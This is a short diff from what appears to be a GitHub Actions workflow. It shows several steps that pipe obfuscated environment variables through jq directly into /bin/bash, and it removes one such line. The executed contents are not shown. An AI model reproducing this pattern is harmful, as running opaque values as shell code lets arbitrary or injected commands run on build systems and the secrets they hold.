@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$jgvhl3168" | jq -r .lamuo0734 | /bin/bash
           printf '%s' "$pin9345" | jq -r .b191 | /bin/bash
           echo $mve2 | jq -r .y2 | /bin/bash
-          printf '%s' "$r81" | jq -r .cc1 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
